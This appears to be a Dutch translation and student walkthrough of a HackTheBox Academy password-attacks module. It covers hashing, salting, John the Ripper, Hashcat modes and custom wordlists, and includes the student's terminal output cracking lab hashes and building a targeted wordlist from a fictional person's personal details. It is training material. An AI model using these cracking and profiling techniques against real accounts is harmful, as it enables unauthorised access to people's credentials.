
Module Overzicht: Password Attacks (Wachtwoordaanvallen)

    Niveau: Medium (Gemiddeld)

    Rol: Offensive (Aanvallend)

    Schatting: 8 uur

    Auteurs: bmdyy (en co-auteurs)

Beschrijving

Wachtwoorden zijn nog steeds de primaire methode voor authenticatie in bedrijfsnetwerken. Als er geen sterk wachtwoordbeleid wordt afgedwongen, kiezen gebruikers vaak zwakke, makkelijk te onthouden wachtwoorden die offline gekraakt kunnen worden om toegang te vergroten. In deze module leer je hoe wachtwoorden worden opgeslagen, hoe je ze kunt achterhalen, methoden om zwakke wachtwoorden te kraken en technieken om hashes te gebruiken die niet gekraakt kunnen worden.
Inhoud van de Module

De module behandelt de volgende kernonderwerpen:

    Theorie van beveiliging: Hoe wachtwoorden worden beschermd.

    Password Mutations: Het aanpassen van woordenlijsten.

    Aanvallen op afstand & lokaal: Voor zowel Linux als Windows.

    Credential Hunting: Zoeken naar inloggegevens in het systeem.

    Password Cracking: Het kraken van bestanden en archieven.

    Geavanceerde technieken: Pass-the-Hash (PtH), Pass-the-Ticket (PtT), en aanvallen op Active Directory (NTDS.dit).

Module Secties (Inhoudsopgave)

    Introductie tot Password Cracking

    John The Ripper & Hashcat

    Custom Wordlists (Eigen woordenlijsten schrijven)

    Kraken van beveiligde bestanden en archieven

    Netwerkdiensten & Password Spraying

    Windows & Linux Authenticatieprocessen

    Aanvallen op SAM, LSASS en NTDS.dit

    Credential Hunting in netwerkverkeer en shares

    Pass-the-Hash / Pass-the-Ticket / Pass-the-Certificate

    Password Managers & Beleid

    Skills Assessment (Eindtoets)

Relevante Trajecten (Paths)

Deze module maakt deel uit van de volgende certificeringstrajecten:

    Penetration Tester: Voor wie een professionele pentester wil worden.

    CREST CPSA/CRT Voorbereiding: Voor de officiële CREST-examens.

    CREST CCT APP/INF: Geavanceerde certificeringen voor webapplicatie- en infrastructuurtesters.

Recensies van Studenten

    MalwareBro: "Geweldige module, de eindopdracht was erg uitdagend."

    majix_2: "Hele nuttige info, maar het kraken duurde soms erg lang. Gebruik een goede woordenlijst."

    RudeRaph: "Moeilijk, lang en stressvol, maar tot nu toe mijn favoriete module!"

    xubster: "Veel geleerd, maar de module is zo groot dat hij eigenlijk in tweeën gesplitst zou kunnen worden."

Password Attacks - Pagina 1: Introductie
Introductie

Vertrouwelijkheid, integriteit en beschikbaarheid (de zogenaamde "CIA-triade") vormen de kern van de verantwoordelijkheden van elke informatiebeveiligingsspecialist. Zonder een balans tussen deze drie kunnen we de veiligheid van onze ondernemingen niet garanderen. Deze balans wordt bewaard door elk bestand, object en host in de omgeving te controleren (auditing); door te valideren dat gebruikers de juiste rechten hebben (autorisatie) om toegang te krijgen tot die bronnen; en door de identiteit van elke gebruiker te verifiëren (authenticatie) voordat toegang wordt verleend.

De meeste datalekken zijn terug te voeren op het falen van een van deze drie principes. Deze module richt zich op het aanvalstraject en het omzeilen van de authenticatie door het compromitteren van gebruikerswachtwoorden op verschillende besturingssystemen, applicaties en encryptiemethoden. Voordat we in het spannende gedeelte duiken — het aanvallen van wachtwoorden — staan we even stil bij authenticatie en de componenten daarvan.
Authenticatie

Authenticatie is in de kern de validatie van je identiteit door een combinatie van vier factoren te presenteren aan een validatiemechanisme. Dit zijn:

    Iets wat je weet: een wachtwoord, pincode, wachtzin, etc.

    Iets wat je hebt: een ID-kaart, smartcard, vertrouwd apparaat/telefoon, etc.

    Iets wat je bent: biometrische kenmerken zoals vingerafdruk, gezichtsherkenning, iris/retina, stem, etc.

    Ergens waar je bent: geolocatie, IP-adres, etc.

Het proces kan een of alle factoren vereisen, afhankelijk van de gevoeligheid van de systemen. Bijvoorbeeld: een arts kan een smartcard (iets wat je hebt) én een pincode (iets wat je weet) nodig hebben. In dit voorbeeld is het wachtwoord de identificatie die met verschillende TTP's (Tactieken, Technieken en Procedures) kan worden omzeild. Zodra het juiste wachtwoord is gegeven, vindt de autorisatie plaats: de set rechten die de gebruiker krijgt na een succesvolle aanmelding.
Het gebruik van wachtwoorden

De meest gebruikte methode is nog steeds het wachtwoord. Een wachtwoord of wachtzin is een combinatie van letters, cijfers en symbolen. Hoewel een standaard 8-cijferig wachtwoord (alleen hoofdletters en cijfers) al 368 (208.827.064.576) mogelijkheden biedt, hoeft het niet altijd complex te zijn. Het kan een songtekst zijn of willekeurige woorden zoals "TreeDogEvilElephant".

Het toevoegen van extra lagen (zoals 2FA) maakt het proces veiliger, maar vaak ook lastiger voor de gebruiker (User Experience). Om die reden blijft de combinatie van gebruikersnaam en wachtwoord de meest wijdverspreide methode vanwege de balans tussen gemak en veiligheid.
Statistieken en Trends

    2019 (Google/Harris Poll): 24% van de Amerikanen gebruikte wachtwoorden zoals 123456 of password. 66% hergebruikte wachtwoorden voor meerdere accounts.

    2025 (Panda Security): De trends blijven vergelijkbaar. 123456 is nog steeds het meest voorkomende wachtwoord (4,5 miljoen keer gevonden in datalekken). Wel is het gebruik van password managers gestegen naar 36% (meer dan een verdubbeling ten opzichte van 6 jaar eerder).

    Gedrag na een lek: Slechts 45% van de mensen verandert hun wachtwoord na een bekend datalek. Dit betekent dat 55% hetzelfde (gelekte) wachtwoord blijft gebruiken. Diensten zoals HaveIBeenPwned kunnen worden gebruikt om te controleren of een e-mailadres voorkomt in bekende databases met gestolen gegevens.

Inhoudsopgave (Module Secties)

    Introductie

    Wachtwoordkraaktechnieken (Password Cracking Techniques)

    Wachtwoordaanvallen op afstand (Remote Password Attacks)

    Wachtwoorden extraheren uit Windows-systemen

    Wachtwoorden extraheren uit Linux-systemen

    Wachtwoorden onderscheppen uit het netwerk

    Windows Lateral Movement technieken

    Wachtwoordbeheer (Password Management)

    Skills Assessment (Eindtoets)


Password Attacks - Pagina 2: Introductie tot Password Cracking
Introductie tot Password Cracking

Wachtwoorden worden meestal gehasht opgeslagen om enige bescherming te bieden voor het geval ze in handen van een aanvaller vallen. Hashing is een wiskundige functie die een willekeurige hoeveelheid invoerbytes omzet in een (meestal) vaste uitvoerlengte. Veelvoorkomende voorbeelden zijn MD5 en SHA-256.

Neem bijvoorbeeld het wachtwoord Soccer06!. De bijbehorende MD5- en SHA-256-hashes kunnen als volgt worden gegenereerd:
Bash

bmdyy@htb:~$ echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

bmdyy@htb:~$ echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -

Hashfuncties zijn ontworpen om in één richting te werken. Dit betekent dat het niet mogelijk zou moeten zijn om het originele wachtwoord te achterhalen op basis van alleen de hash. Wanneer aanvallers dit toch proberen, noemen we dat password cracking. Veelgebruikte technieken zijn het gebruik van rainbow tables, dictionary attacks en, meestal als laatste redmiddel, brute-force attacks.
Rainbow Tables

Rainbow tables zijn grote, vooraf gecompileerde mappen van invoer- en uitvoerwaarden voor een specifieke hashfunctie. Hiermee kan heel snel een wachtwoord worden geïdentificeerd als de bijbehorende hash al in kaart is gebracht.

Omdat rainbow tables zo krachtig zijn, wordt salting gebruikt. Een salt is in cryptografische termen een willekeurige reeks bytes die aan een wachtwoord wordt toegevoegd voordat het wordt gehasht. Om het effect te maximaliseren, mogen salts niet worden hergebruikt (bijv. niet dezelfde salt voor alle wachtwoorden in een database).

Als we bijvoorbeeld de salt Th1sIsTh3S@lt_ voor het wachtwoord plaatsen, verandert de MD5-hash volledig:
Bash

leonwintweer@htb[/htb]$ echo -n Th1sIsTh3S@lt_Soccer06! | md5sum
90a10ba83c04e7996bc53373170b5474  -

Een salt is geen geheim; het systeem moet weten welke salt is gebruikt om de hash te kunnen controleren. Daarom worden salts meestal vóór de hash geplaatst. Deze techniek werkt tegen rainbow tables omdat de combinatie van salt + wachtwoord hoogstwaarschijnlijk niet in de tabel staat.
Brute-force Attack

Bij een brute-force aanval worden alle mogelijke combinaties van letters, cijfers en symbolen geprobeerd totdat het juiste wachtwoord is gevonden. Dit kan erg lang duren, vooral bij lange wachtwoorden, maar korte wachtwoorden (< 9 tekens) zijn haalbare doelen. Brute-forcing is de enige techniek die 100% effectief is: met genoeg tijd wordt elk wachtwoord gekraakt. Vanwege de tijdsduur wordt het echter zelden gebruikt voor sterke wachtwoorden en vaak vervangen door de efficiëntere mask attacks.

    Let op: De snelheid van brute-forcing hangt sterk af van het algoritme en de hardware. Op een standaard laptop kan een tool als hashcat meer dan 5 miljoen MD5-hashes per seconde raden, terwijl dat bij een DCC2-hash slechts 10.000 per seconde kan zijn.

Dictionary Attack

Een dictionary attack (woordenlijst-aanval) is een van de meest efficiënte technieken, vooral onder tijdsdruk. In plaats van elke mogelijke combinatie te proberen, wordt een lijst gebruikt met wachtwoorden die statistisch gezien waarschijnlijk zijn. Bekende woordenlijsten zijn rockyou.txt en de lijsten in SecLists.
Bash

leonwintweer@htb[/htb]$ head --lines=20 /usr/share/wordlists/rockyou.txt 
123456
12345
...
qwerty

    Wist je dat? rockyou.txt bevat meer dan 14 miljoen echte wachtwoorden die zijn gelekt bij de hack van de RockYou-website in 2009. Het bedrijf had destijds de bizarre beslissing genomen om alle wachtwoorden onversleuteld op te slaan!

Vraag van deze sectie

Vraag: Wat is de SHA1-hash voor Academy#2025?

(Tip: Gebruik het commando echo -n Academy#2025 | sha1sum in een terminal om het antwoord te vinden.)

┌──(kali㉿kali)-[~]
└─$ echo -n Academy#2025 | sha1sum
750fe4b402dc9f91cedf09b652543cd85406be8c  -

Password Attacks - Pagina 3: Introductie tot John the Ripper
Wat is John the Ripper?

John the Ripper (ook wel JtR of simpelweg john) is een bekende pentesting-tool voor het kraken van wachtwoorden via brute-force en dictionary attacks. Het is open-source software die oorspronkelijk in 1996 werd uitgebracht. Voor professioneel gebruik wordt de "Jumbo"-variant aangeraden; deze bevat prestatie-optimalisaties en ondersteunt meer bestandstypen en 64-bit architecturen.
Kraak-modi (Cracking Modes)
1. Single Crack Mode

Dit is een op regels gebaseerde techniek die zeer effectief is tegen Linux-inloggegevens. JtR genereert kandidaat-wachtwoorden op basis van de gebruikersnaam, de home-directory en de GECOS-waarden (zoals de volledige naam of het telefoonnummer van een gebruiker).

    Voorbeeld: Als de echte naam van een gebruiker "Bob Smith" is, zal deze modus variaties proberen zoals Smith1, Bob123, etc.

Commando:
Bash

leonwintweer@htb[/htb]$ john --single passwd

2. Wordlist Mode (Woordenlijst-modus)

Dit is de klassieke dictionary attack. JtR probeert elk wachtwoord uit een opgegeven tekstbestand (één wachtwoord per regel).

Commando:
Bash

leonwintweer@htb[/htb]$ john --wordlist=<woordenlijst_bestand> <hash_bestand>

Tip: Je kunt eigen regels (--rules) toevoegen om woorden uit de lijst te transformeren (bijv. cijfers achteraan toevoegen).
3. Incremental Mode

Dit is de meest grondige brute-force modus. JtR genereert zelf wachtwoorden op basis van een statistisch model (Markov-ketens). Het probeert alle karaktercombinaties, maar geeft prioriteit aan combinaties die statistisch gezien vaker voorkomen. Dit is de meest tijdrovende modus.

Commando:
Bash

leonwintweer@htb[/htb]$ john --incremental <hash_bestand>

Hashformaten identificeren

Soms kom je een hash tegen waarvan je het type niet weet (bijv. 193069ceb0461e1d40d216e32c79c704). Je kunt tools zoals hashID gebruiken om te achterhalen welk algoritme is gebruikt.

Commando:
Bash

leonwintweer@htb[/htb]$ hashid -j 193069ceb0461e1d40d216e32c79c704

De -j vlag laat direct zien welk formaat je in John the Ripper moet opgeven (bijv. raw-md5 of nt).
Bestanden kraken (2john-tools)

Je kunt met JtR ook beveiligde bestanden kraken (zoals ZIP, PDF of SSH-sleutels). Hiervoor moet je het bestand eerst omzetten naar een hash die JtR begrijpt met de zogenoemde "2john" tools.

Algemene werkwijze:
Bash

<tool> <bestand_om_te_kraken> > bestand.hash
john bestand.hash

Veelgebruikte tools:

    pdf2john: Voor PDF-documenten.

    zip2john: Voor ZIP-archieven.

    ssh2john: Voor SSH-private keys.

    office2john: Voor MS Office-bestanden.

Vragen van deze sectie

    Vraag: Gebruik de single-crack mode om het wachtwoord van gebruiker r0lf te kraken.

    Vraag: Gebruik de wordlist-mode met rockyou.txt om de RIPEMD-128 hash te kraken.

 echo "193069ceb0461e1d40d216e32c79c704" > hash.txt


──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=ripemd-128 hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ripemd-128, RIPEMD 128 [32/64])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
50cent           (?)     
1g 0:00:00:00 DONE (2026-02-16 16:11) 100.0g/s 32000p/s 32000c/s 32000C/s angelo..101010
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ echo "r0lf:\$6\$ues25dIanlctrWxg\$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bash" > passwd.txt
                                                                                                                                                               
┌──(kali㉿kali)-[~]
└─$ john --single passwd.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
NAITSABES        (r0lf)     
1g 0:00:00:00 DONE (2026-02-16 16:13) 2.000g/s 848.0p/s 848.0c/s 848.0C/s NAITSABESFL0R..FL0RNAITSABES
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 



Hier is de vertaling en uitleg van de pagina over Hashcat.
Introductie tot Hashcat

Hashcat is een bekende password cracking tool voor Linux, Windows en macOS. Oorspronkelijk was het closed-source, maar sinds 2015 is het open-source. Hashcat staat vooral bekend om zijn fantastische GPU-ondersteuning (videokaart), waardoor het extreem snel hashes kan kraken. Net als John the Ripper ondersteunt Hashcat verschillende aanvalsmodi.

De algemene syntaxis voor Hashcat is:
hashcat -a [attack_mode] -m [hash_type] <hashes> [wordlist/rules/mask]

    -a: Specificeert de aanvalsmodus (Attack Mode).

    -m: Specificeert het type hash (Hash Mode ID).

    <hashes>: De hash-string zelf of een bestand met hashes.

    [wordlist, rule, mask...]: Aanvullende argumenten afhankelijk van de gekozen aanvalsmodus.

Hash Types (Hash-modi)

Hashcat ondersteunt honderden hashtypes, elk met een eigen ID. Je kunt een lijst met alle ID's opvragen via hashcat --help.
ID	Naam	Categorie
0	MD5	Raw Hash
100	SHA1	Raw Hash
1400	SHA2-256	Raw Hash
1000	NTLM	Windows Hash

Tip: Als je niet weet welk type hash je hebt, gebruik dan hashid -m om direct de juiste Hashcat-ID te vinden.
Aanvalsmodi (Attack Modes)
1. Dictionary Attack (-a 0)

Dit is de standaard woordenlijst-aanval. Hashcat test elk woord uit een lijst (zoals rockyou.txt) tegen de hash.

Voorbeeld (MD5 kraken):
Bash

hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt

Gebruik van Regels (Rules)

Soms is een standaardlijst niet genoeg. Met rules (-r) kun je variaties maken (bijv. een cijfer toevoegen of letters vervangen door cijfers zoals a -> 4).
Veelgebruikte regelbestanden staan in /usr/share/hashcat/rules/, zoals best64.rule.

Voorbeeld met regels:
Bash

hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

2. Mask Attack (-a 3)

Dit is een gerichte brute-force aanval waarbij je de structuur van het wachtwoord definieert. Als je weet dat een wachtwoord 7 tekens lang is en eindigt op een cijfer en een symbool, kun je een "masker" maken.

Ingebouwde tekensets:

    ?l: Kleine letters (abcd...)

    ?u: Hoofdletters (ABCD...)

    ?d: Cijfers (0123...)

    ?s: Speciale tekens (!@#$...)

    ?a: Alles gecombineerd

Voorbeeld:
Wil je een wachtwoord kraken dat begint met een hoofdletter, gevolgd door vier kleine letters, een cijfer en een symbool? Dan is het masker: ?u?l?l?l?l?d?s.

Commando:
Bash

hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'

Handige tip: Als je Hashcat op een virtuele machine (zoals Kali in VirtualBox) draait, kan hij soms klagen dat hij de GPU niet kan vinden. Je kunt dan de vlag --force toevoegen om de CPU te gebruiken, al gaat dat een stuk trager.



┌──(kali㉿kali)-[~]
└─$ echo "e3e3ec5831ad5e7288241960e5d4fdb8" > hash1.txt      
                                                                             
┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 hash1.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 2930/5861 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (4701 MB free)
                                                                                                                                                                                                                
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt                                                                                                                                                                                              
* Passwords.: 14344392                                                                                                                                                                                                                      
* Bytes.....: 139921507                                                                                                                                                                                                                     
* Keyspace..: 14344385                                                                                                                                                                                                                      
* Runtime...: 2 secs                                                                                                                                                                                                                        
                                                                                                                                                                                                                    
e3e3ec5831ad5e7288241960e5d4fdb8:crazy!                   
                                                                                                                                                                                                                
Session..........: hashcat                                                                                                                                                                                                                  
Status...........: Cracked                                                                                                                                                                                                                  
Hash.Mode........: 0 (MD5)                                                                                                                                                                                                                  
Hash.Target......: e3e3ec5831ad5e7288241960e5d4fdb8                                                                                                                                                                                         
Time.Started.....: Tue Feb 17 04:26:20 2026 (1 sec)                                                                                                                                                                                         
Time.Estimated...: Tue Feb 17 04:26:21 2026 (0 secs)                                                                                                                                                                                        
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)                                                                                                                                                                                
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)                                                                                                                                                                                  
Guess.Queue......: 1/1 (100.00%)                                                                                                                                                                                                            
Speed.#01........:    55135 H/s (0.42ms) @ Accel:1024 Loops:1 Thr:1 Vec:8                                                                                                                                                                   
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)                                                                                                                                                               
Progress.........: 28672/14344385 (0.20%)                                                                                                                                                                                                   
Rejected.........: 0/28672 (0.00%)                                                                                                                                                                                                          
Restore.Point....: 26624/14344385 (0.19%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 200390 -> spongebob9
Hardware.Mon.#01.: Util: 96%

Started: Tue Feb 17 04:25:20 2026
Stopped: Tue Feb 17 04:26:22 2026

echo "1b0556a75770563578569ae21392630c" > hash2.txt

┌──(kali㉿kali)-[~]
└─$ hashcat -m 0 hash2.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 2930/5861 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 66

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (4869 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 946729410

1b0556a75770563578569ae21392630c:c0wb0ys1                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1b0556a75770563578569ae21392630c
Time.Started.....: Tue Feb 17 04:28:30 2026 (0 secs)
Time.Estimated...: Tue Feb 17 04:28:30 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best66.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  7286.3 kH/s (10.16ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 266240/946729410 (0.03%)
Rejected.........: 0/266240 (0.00%)
Restore.Point....: 2048/14344385 (0.01%)
Restore.Sub.#01..: Salt:0 Amplifier:0-64 Iteration:0-64
Candidate.Engine.: Device Generator
Candidates.#01...: slimshady -> oooo
Hardware.Mon.#01.: Util: 62%

Started: Tue Feb 17 04:28:29 2026
Stopped: Tue Feb 17 04:28:32 2026




echo "1e293d6912d074c0fd15844d803400dd" > hash3.txt

                                                                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Athlon 3000G with Radeon Vega Graphics, 2930/5861 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (4519 MB free)

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 0 (MD5)
Hash.Target......: 1e293d6912d074c0fd15844d803400dd
Time.Started.....: Tue Feb 17 05:02:30 2026 (4 secs)
Time.Estimated...: Tue Feb 17 05:03:48 2026 (1 min, 14 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Mask.......: ?u?l?l?l?l?d?s [7]
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 49831.2 kH/s (13.69ms) @ Accel:377 Loops:1024 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 183861392/3920854080 (4.69%)
Rejected.........: 0/183861392 (0.00%)
Restore.Point....: 9802/223080 (4.39%)
Restore.Sub.#01..: Salt:0 Amplifier:15360-16384 Iteration:0-1024
Candidate.Engine.: Device Generator
Candidates.#01...: Ofwek8. -> Adxql9.
Hardware.Mon.#01.: Util: 97%

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

1e293d6912d074c0fd15844d803400dd:Mouse5!                  
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 1e293d6912d074c0fd15844d803400dd
Time.Started.....: Tue Feb 17 05:02:30 2026 (11 secs)
Time.Estimated...: Tue Feb 17 05:02:41 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Mask.......: ?u?l?l?l?l?d?s [7]
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 45689.5 kH/s (16.03ms) @ Accel:377 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 468463216/3920854080 (11.95%)
Rejected.........: 0/468463216 (0.00%)
Restore.Point....: 26390/223080 (11.83%)
Restore.Sub.#01..: Salt:0 Amplifier:5120-6144 Iteration:0-1024
Candidate.Engine.: Device Generator
Candidates.#01...: Uayel5! -> Dikqq1-
Hardware.Mon.#01.: Util: 96%

Started: Tue Feb 17 05:02:28 2026
Stopped: Tue Feb 17 05:02:42 2026


Hier is de vertaling van de vijfde pagina van de module Password Attacks, waarin je leert hoe je gepersonaliseerde woordenlijsten en regels maakt.
Pagina 5: Eigen woordenlijsten en regels schrijven

Veel gebruikers kiezen wachtwoorden op basis van eenvoud in plaats van veiligheid. Om deze menselijke neiging tegen te gaan, dwingen systemen vaak een wachtwoordbeleid (password policy) af. Denk aan een minimale lengte (vaak 8 tekens) en het gebruik van hoofdletters, cijfers en speciale tekens.

Zelfs mét zo'n beleid volgen mensen voorspelbare patronen. Ze gebruiken vaak woorden die gerelateerd zijn aan hun werk (bedrijfsnaam) of privéleven (huisdieren, hobby's, sport). Met OSINT (Open Source Intelligence) kun je deze informatie verzamelen om gerichter te kunnen gokken.
Voorspelbare patronen:
Omschrijving	Voorbeeld Syntax
Eerste letter hoofdletter	Wachtwoord
Cijfers toevoegen	Wachtwoord123
Jaartal toevoegen	Wachtwoord2022
Maand toevoegen	Wachtwoord02
Eindigen met uitroepteken	Wachtwoord2022!
Speciale tekens vervangen	W@chtw00rd2022!
Hashcat Regels (Rules)

Je kunt Hashcat gebruiken om een basiswoord te muteren (veranderen) aan de hand van regels.

Belangrijke functies in een .rule bestand:

    : : Doe niets (het originele woord).

    l : Alles naar kleine letters.

    u : Alles naar hoofdletters.

    c : Eerste letter hoofdletter, rest klein.

    sXY : Vervang alle X'en door Y's (bijv. so0 vervangt 'o' door '0').

    $! : Voeg een ! toe aan het einde.

Voorbeeld van mutatie:

Stel, je hebt een bestand password.list met daarin het woord password.
Je voert het volgende uit:
Bash

hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

Dit genereert varianten zoals Password, p@ssw0rd!, etc.
Woordenlijsten genereren met CeWL

CeWL (Custom Word List generator) is een tool die een website "spidert" en alle unieke woorden verzamelt. Dit is ideaal om een lijst te maken met termen die specifiek zijn voor een bedrijf.

Commando:
Bash

cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

    -d 4: Zoek tot 4 subpagina's diep.

    -m 6: Alleen woorden van minimaal 6 tekens.

    --lowercase: Alles in kleine letters opslaan.

Oefening: Mark White kraken

In deze oefening moet je het wachtwoord van Mark White achterhalen. Hier is zijn dossier:

    Geboortedatum: 5 augustus 1998.

    Werkgever: Nexura, Ltd.

    Woonplaats: San Francisco.

    Huisdier: Bella (kat).

    Vrouw: Maria.

    Zoon: Alex.

    Hobby: Honkbal (baseball).

    Wachtwoordbeleid: Minimaal 12 tekens, hoofdletter, kleine letter, symbool en een cijfer.

    Hash: 97268a8ae45ac7d15c3cea4ce6ea550b

Strategie om Mark te kraken:

    Maak een basislijst: Zet termen als Nexura, Bella, Maria, Alex, Baseball, Francisco en August in een bestand (bijv. mark.txt).

    Maak een regelbestand: Omdat het wachtwoord 12 tekens moet zijn, moet je combinaties maken. Gebruik bijvoorbeeld regels om 1998 of 2025 toe te voegen, of combinaties van namen.

    Bepaal de hash-modus: Gebruik hashid op de hash om te zien of het MD5, SHA1 of NT is.

    Kraken:
    Bash

hashcat -a 0 -m [ID] 97268a8ae45ac7d15c3cea4ce6ea550b mark.txt -r /usr/share/hashcat/rules/best64.rule


──(kali㉿kali)-[~]
└─$ cat > mark.wordlist << EOF
heredoc> Bella
heredoc> Maria
heredoc> Alex      
heredoc> Nexura
heredoc> Baseball
heredoc> August
heredoc> Mark
heredoc> White
heredoc> EOF


──(kali㉿kali)-[~]
└─$ cat > mark.rule << 'EOF'                                                     
heredoc> c $1 $9 $9 $8 $!
heredoc> c $1 $9 $9 $8 $@
heredoc> c $2 $0 $2 $2 $!
heredoc> c $2 $0 $2 $3 $!
heredoc> c $0 $8 $0 $5 $1 $9 $9 $8 $!
heredoc> c $1 $9 $9 $8 $0 $8 $!
heredoc> c $1 $9 $9 $8 $0 $8 $0 $5 $!
heredoc> EOF


┌──(kali㉿kali)-[~]
└─$ hashcat --force mark.wordlist -r mark.rule --stdout | sort -u > mut_mark.list
                                                                                                                   
┌──(kali㉿kali)-[~]
└─$ cat mut_mark.list
Alex08051998!
Alex1998!
Alex1998@
Alex199808!
